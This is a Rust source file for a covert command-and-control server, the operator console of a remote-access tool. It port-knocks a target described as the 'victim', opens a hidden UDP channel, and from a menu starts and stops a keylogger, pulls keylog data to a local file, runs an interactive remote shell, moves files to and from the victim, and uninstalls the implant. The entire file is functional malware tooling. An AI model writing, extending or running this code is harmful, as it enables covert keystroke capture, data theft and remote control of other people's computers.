/// Covert C2 Commander Server
///
/// Features:
/// - Menu-driven state machine (Disconnected/Connected)
/// - Port knock initiation via port_knkr module
/// - Covert UDP channel for C2 commands
/// - Keylogger control, shell execution, file transfer
///
/// Compliance: All protocol data in UDP payload only.
/// UDP header fields are OS-managed; no transport-layer abuse.

use std::collections::HashMap;
use std::io::{self, Write};
use std::net::{Ipv4Addr, IpAddr, SocketAddr, UdpSocket};
use std::sync::{Arc, atomic::{AtomicBool, Ordering}};
use std::thread;
use std::time::{Duration, Instant};

use pnet::packet::ip::IpNextHeaderProtocols;
use pnet::transport::{transport_channel, TransportChannelType::Layer3};
use pnet_datalink as datalink;

// Import modules
mod port_knkr;
mod packet;

use port_knkr::{KnockSession, port_knock};
use packet::{PacketHeader, HEADER_SIZE,
             PACKET_TYPE_ACK, PACKET_TYPE_HEARTBEAT,
             PACKET_TYPE_CMD, PACKET_TYPE_CMD_RESP,
             PACKET_TYPE_CTRL, PACKET_TYPE_FILE, PACKET_TYPE_KEYLOG,
             CTRL_START_KEYLOGGER, CTRL_STOP_KEYLOGGER,
             CTRL_REQUEST_KEYLOG, CTRL_UNINSTALL};

// Configuration
const BUFFER_SIZE: usize = 4096;
const MAX_RETRIES: u32 = 3;
const CHUNK_SIZE: usize = 1024;

// Session state machine
#[derive(Clone, Copy, PartialEq)]
enum SessionState {
    Disconnected,
    Connected,
}

// C2 Commander struct
pub struct Commander {
    state: SessionState,
    victim_ip: Option<Ipv4Addr>,
    local_ip: Option<Ipv4Addr>,
    tx_port: u16,
    rx_port: u16,
    knock_session: Option<KnockSession>,
    udp_socket: Option<UdpSocket>,
    running: Arc<AtomicBool>,
    pending_commands: HashMap<[u8; 16], Instant>,
    keylog_buffer: HashMap<Ipv4Addr, Vec<u8>>,
}

impl Commander {
    pub fn new() -> Self {
        Self {
            state: SessionState::Disconnected,
            victim_ip: None,
            local_ip: None,
            tx_port: 0,
            rx_port: 0,
            knock_session: None,
            udp_socket: None,
            running: Arc::new(AtomicBool::new(true)),
            pending_commands: HashMap::new(),
            keylog_buffer: HashMap::new(),
        }
    }

    pub fn run(&mut self) {
        println!("=== Covert C2 Commander ===");
        
        let shutdown = self.running.clone();
        ctrlc::set_handler(move || {
            println!("\nShutdown signal received");
            shutdown.store(false, Ordering::SeqCst);
        }).expect("Error setting Ctrl-C handler");

        while self.running.load(Ordering::SeqCst) {
            match self.state {
                SessionState::Disconnected => self.disconnected_menu(),
                SessionState::Connected => self.connected_menu(),
            }
            
            self.process_incoming();
            thread::sleep(Duration::from_millis(50));
        }
        
        self.cleanup();
        println!("Commander exiting");
    }

    fn disconnected_menu(&mut self) {
        println!("\n[DISCONNECTED]");
        println!("1) Initiate session (Port Knock)");
        println!("0) Exit");
        
        match prompt("Selection > ").as_str() {
            "1" => self.initiate_connection(),
            "0" => {
                self.running.store(false, Ordering::SeqCst);
            },
            _ => println!("[!] Invalid selection"),
        }
    }

    fn connected_menu(&mut self) {
        if let Some(ip) = self.victim_ip {
            println!("\n[CONNECTED] -> {:?}", ip);
        }
        println!("1) Start Keylogger");
        println!("2) Stop Keylogger");
        println!("3) Request Keylog File");
        println!("4) Run Shell Command");
        println!("5) Transfer File to Victim");
        println!("6) Transfer File from Victim");
        println!("7) Uninstall Agent");
        println!("8) Disconnect");
        println!("0) Exit Commander");
        
        match prompt("Selection > ").as_str() {
            "1" => self.start_keylogger(),
            "2" => self.stop_keylogger(),
            "3" => self.request_keylog_file(),
            "4" => self.run_program(),
            "5" => self.upload_file(),
            "6" => self.download_file(),
            "7" => self.uninstall(),
            "8" => self.disconnect(),
            "0" => {
                self.running.store(false, Ordering::SeqCst);
            },
            _ => println!("[!] Invalid selection"),
        }
    }

    fn initiate_connection(&mut self) {
        let target_ip_str = prompt("Target IP [127.0.0.1]: ");
        let ip = target_ip_str.parse::<Ipv4Addr>()
            .unwrap_or_else(|_| Ipv4Addr::new(127, 0, 0, 1));

        println!("Sending knock sequence to {}...", ip);
        
        match port_knock(ip) {
            Ok(session) => {
                let tx_port = session.tx_port;
                let rx_port = session.rx_port;
                
                self.victim_ip = Some(ip);
                self.tx_port = tx_port;
                self.rx_port = rx_port;
                self.knock_session = Some(session);
                 
                self.local_ip = Self::find_interface_for_target(ip)
                    .map(|(_, local)| local)
                    .or(Some(Ipv4Addr::new(127, 0, 0, 1)));

                match UdpSocket::bind(format!("0.0.0.0:{}", self.rx_port)) {
                    Ok(socket) => {
                        socket.set_read_timeout(Some(Duration::from_millis(100))).ok();
                        self.udp_socket = Some(socket);
                        println!("[+] Covert channel: send->{} recv<-{}", 
                                self.tx_port, self.rx_port);
                        
                        self.state = SessionState::Connected;
                        self.send_heartbeat();
                    }
                    Err(e) => {
                        eprintln!("[!] UDP bind failed: {}", e);
                        if let Some(ref sess) = self.knock_session {
                            sess.stop();
                        }
                    }
                }
            }
            Err(e) => println!("[!] Knock failed: {}", e),
        }
    }

    fn find_interface_for_target(target: Ipv4Addr) -> Option<(String, Ipv4Addr)> {
        let interfaces = datalink::interfaces();
        for iface in &interfaces {
            for ip_net in &iface.ips {
                if let IpAddr::V4(local) = ip_net.ip() {
                    if ip_net.contains(IpAddr::V4(target)) || local.is_loopback() {
                        return Some((iface.name.clone(), local));
                    }
                }
            }
        }
        None
    }

    fn send_command(&mut self, ptype: u8, subtype: u8, content: &str) -> Option<[u8; 16]> {
        if let (Some(udp), Some(victim)) = (&self.udp_socket, self.victim_ip) {
            let header = PacketHeader::new(ptype, subtype, content);
            let msg_id = header.message_id;
            
            let mut packet = Vec::with_capacity(HEADER_SIZE + content.len());
            packet.extend_from_slice(&header.to_bytes());
            packet.extend_from_slice(content.as_bytes());
            
            let server_addr = SocketAddr::new(victim.into(), self.tx_port);
            
            for retry in 0..MAX_RETRIES {
                if udp.send_to(&packet, server_addr).is_ok() {
                    self.pending_commands.insert(msg_id, Instant::now());
                    return Some(msg_id);
                }
                thread::sleep(Duration::from_millis(100 * (retry as u64 + 1)));
            }
        }
        None
    }

    fn send_packet(&self, ptype: u8, subtype: u8, content: &[u8]) -> Result<(), String> {
        if let (Some(udp), Some(victim)) = (&self.udp_socket, self.victim_ip) {
            let content_str = String::from_utf8_lossy(content);
            let header = PacketHeader::new(ptype, subtype, &content_str);
            
            let mut packet = Vec::with_capacity(HEADER_SIZE + content.len());
            packet.extend_from_slice(&header.to_bytes());
            packet.extend_from_slice(content);
            
            let server_addr = SocketAddr::new(victim.into(), self.tx_port);
            
            for retry in 0..MAX_RETRIES {
                if udp.send_to(&packet, server_addr).is_ok() {
                    return Ok(());
                }
                thread::sleep(Duration::from_millis(100 * (retry as u64 + 1)));
            }
            Err("Failed to send packet after retries".to_string())
        } else {
            Err("No UDP socket or victim IP".to_string())
        }
    }

    fn send_control(&self, subtype: u8) {
        let header = PacketHeader::new_ctrl(subtype);
        let mut packet = [0u8; HEADER_SIZE];
        packet.copy_from_slice(&header.to_bytes());
        
        if let (Some(udp), Some(victim)) = (&self.udp_socket, self.victim_ip) {
            let addr = SocketAddr::new(victim.into(), self.tx_port);
            let _ = udp.send_to(&packet, addr);
        }
    }

    fn send_heartbeat(&self) {
        if let (Some(udp), Some(victim)) = (&self.udp_socket, self.victim_ip) {
            let hb = PacketHeader::new_heartbeat();
            let mut buf = [0u8; HEADER_SIZE];
            buf.copy_from_slice(&hb.to_bytes());
            let addr = SocketAddr::new(victim.into(), self.tx_port);
            let _ = udp.send_to(&buf, addr);
        }
    }

    fn process_incoming(&mut self) {
        if let Some(ref udp) = self.udp_socket {
            let mut buffer = [0u8; BUFFER_SIZE];
            
            udp.set_read_timeout(Some(Duration::from_millis(1))).ok();
             
            while let Ok((size, addr)) = udp.recv_from(&mut buffer) {
                if size < HEADER_SIZE { continue; }
                
                if let Some(header) = PacketHeader::from_bytes(&buffer[..size]) {
                    let payload = &buffer[HEADER_SIZE..size];
                    
                    match header.packet_type {
                        PACKET_TYPE_ACK => {
                            self.pending_commands.remove(&header.message_id);
                        }
                        PACKET_TYPE_CMD_RESP => {
                            if let Ok(resp) = String::from_utf8(payload.to_vec()) {
                                println!("\n{}", resp);
                            }
                        }
                        PACKET_TYPE_KEYLOG | PACKET_TYPE_FILE => {
                            if let Some(ip) = self.victim_ip {
                                self.keylog_buffer.entry(ip)
                                    .or_insert_with(Vec::new)
                                    .extend_from_slice(payload);
                            }
                        }
                        PACKET_TYPE_HEARTBEAT => {
                            let ack = PacketHeader::new_ack(header.message_id);
                            let mut ack_buf = [0u8; HEADER_SIZE];
                            ack_buf.copy_from_slice(&ack.to_bytes());
                            let _ = udp.send_to(&ack_buf, addr);
                        }
                        _ => {}
                    }
                }
            }
        }
        
        let now = Instant::now();
        self.pending_commands.retain(|_, sent| {
            now.duration_since(*sent) < Duration::from_secs(10)
        });
    }

    fn start_keylogger(&mut self) {
        self.send_control(CTRL_START_KEYLOGGER);
    }

    fn stop_keylogger(&mut self) {
        self.send_control(CTRL_STOP_KEYLOGGER);
    }

    fn request_keylog_file(&mut self) {
        println!("Requesting keylog file...");
        self.send_control(CTRL_REQUEST_KEYLOG);
        
        println!("Waiting for keylog data (Ctrl+C to cancel)...");
        let start = Instant::now();
        while start.elapsed() < Duration::from_secs(30) && self.running.load(Ordering::SeqCst) {
            self.process_incoming();
            if let Some(ip) = self.victim_ip {
                if let Some(data) = self.keylog_buffer.get(&ip) {
                    if !data.is_empty() {
                        println!("\nReceived {} bytes of keylog data", data.len());
                        if let Ok(mut f) = std::fs::File::create("keylog.txt") {
                            use std::io::Write;
                            let _ = f.write_all(data);
                            println!("Saved to keylog.txt");
                        }
                        self.keylog_buffer.remove(&ip);
                        return;
                    }
                }
            }
            thread::sleep(Duration::from_millis(200));
        }
        println!("[!] Timeout waiting for keylog data");
    }

    fn run_program(&mut self) {
        println!("[*] Interactive shell (type 'exit' to return to menu)");
        
        loop {
            let cmd = prompt("Shell > ");
            
            if cmd.trim().to_lowercase() == "exit" {
                println!("[+] Returning to menu...");
                break;
            }
            
            if cmd.is_empty() {
                continue;
            }
            
            if self.send_command(PACKET_TYPE_CMD, 0, &cmd).is_some() {
                let start = Instant::now();
                while start.elapsed() < Duration::from_secs(10) && self.running.load(Ordering::SeqCst) {
                    self.process_incoming();
                    if self.pending_commands.is_empty() {
                        break;
                    }
                    thread::sleep(Duration::from_millis(100));
                }
            }
        }
    }

    fn upload_file(&mut self) {
        let local_path = prompt("Local file path: ");
        let remote_path = prompt("Remote file path: ");
        
        if local_path.is_empty() || remote_path.is_empty() {
            println!("[!] Invalid paths");
            return;
        }

        println!("[*] Uploading {} -> {}...", local_path, remote_path);
        
        let file_data = match std::fs::read(&local_path) {
            Ok(data) => data,
            Err(e) => {
                println!("[!] Failed to read file: {}", e);
                return;
            }
        };

        // Build metadata: path_len + path + file_size
        let mut metadata = Vec::new();
        metadata.push(remote_path.as_bytes().len() as u8);
        metadata.extend_from_slice(remote_path.as_bytes());
        metadata.extend_from_slice(&(file_data.len() as u32).to_le_bytes());
        
        // Send as PACKET_TYPE_FILE (not CMD)
        if self.send_packet(PACKET_TYPE_FILE, 0, &metadata).is_err() {
            println!("[!] Failed to send metadata");
            return;
        }
        println!("[+] Metadata sent");

        let total_chunks = (file_data.len() + CHUNK_SIZE - 1) / CHUNK_SIZE;
        for (i, chunk) in file_data.chunks(CHUNK_SIZE).enumerate() {
            print!("\r[*] Uploading chunk {}/{}...", i + 1, total_chunks);
            io::stdout().flush().unwrap();
            
            if self.send_packet(PACKET_TYPE_FILE, 0, chunk).is_err() {
                println!("\n[!] Failed to send chunk {}", i + 1);
                return;
            }
            thread::sleep(Duration::from_millis(50));
        }

        self.send_packet(PACKET_TYPE_FILE, 0, &[0xFF]).ok();
        println!("\n[+] File upload complete!");
    }

    fn download_file(&mut self) {
        let remote_path = prompt("Remote file path: ");
        let local_path = prompt("Local save path: ");
        
        if remote_path.is_empty() || local_path.is_empty() {
            println!("[!] Invalid paths");
            return;
        }

        println!("[*] Downloading {} -> {}...", remote_path, local_path);
        
        let mut request = Vec::new();
        request.push(0x70);
        request.push(remote_path.as_bytes().len() as u8);
        request.extend_from_slice(remote_path.as_bytes());
        
        if self.send_packet(PACKET_TYPE_CMD, 0, &request).is_err() {
            println!("[!] Failed to send download request");
            return;
        }
        println!("[+] Download request sent");

        let mut file_data = Vec::new();
        let start = Instant::now();
        let mut chunk_count = 0;

        println!("[*] Receiving file data...");
        
        while start.elapsed() < Duration::from_secs(60) && self.running.load(Ordering::SeqCst) {
            self.process_incoming();
            
            if let Some(ip) = self.victim_ip {
                if let Some(data) = self.keylog_buffer.get(&ip) {
                    if data.len() == 1 && data[0] == 0xFF {
                        break;
                    }
                    file_data.extend_from_slice(data);
                    chunk_count += 1;
                    print!("\r[*] Received {} chunks...", chunk_count);
                    io::stdout().flush().unwrap();
                    self.keylog_buffer.remove(&ip);
                }
            }
            thread::sleep(Duration::from_millis(100));
        }

        if !file_data.is_empty() {
            match std::fs::write(&local_path, &file_data) {
                Ok(_) => println!("\n[+] Download complete! Saved to {}", local_path),
                Err(e) => println!("\n[!] Failed to write file: {}", e),
            }
        } else {
            println!("\n[!] No data received");
        }
    }

    fn uninstall(&mut self) {
        println!("Uninstalling agent from victim...");
        if prompt("Confirm uninstall? (yes/no) > ").to_lowercase() == "yes" {
            self.send_control(CTRL_UNINSTALL);
            println!("Uninstall signal sent");
            thread::sleep(Duration::from_secs(2));
            self.disconnect();
        } else {
            println!("Uninstall cancelled");
        }
    }

    fn disconnect(&mut self) {
        println!("Disconnecting from victim...");
        
        if let Some(ref session) = self.knock_session {
            session.stop();
        }
        
        self.state = SessionState::Disconnected;
        self.victim_ip = None;
        self.udp_socket = None;
        self.knock_session = None;
        self.pending_commands.clear();
        self.keylog_buffer.clear();
        
        println!("[+] Disconnected");
    }

    fn cleanup(&mut self) {
        self.disconnect();
        self.running.store(false, Ordering::SeqCst);
    }
}

fn prompt(text: &str) -> String {
    print!("{}", text);
    let _ = io::stdout().flush();
    let mut input = String::new();
    let _ = io::stdin().read_line(&mut input);
    input.trim().to_string()
}

fn main() -> std::io::Result<()> {
    match transport_channel(4096, Layer3(IpNextHeaderProtocols::Tcp)) {
        Ok(_) => {},
        Err(e) => {
            eprintln!("[!] Warning: Raw socket failed: {}", e);
            eprintln!("    Run with: doas ./commander  OR  set CAP_NET_RAW capability");
            eprintln!("    Continuing with menu anyway...\n");
        }
    }
    
    let mut commander = Commander::new();
    commander.run();
    Ok(())
}
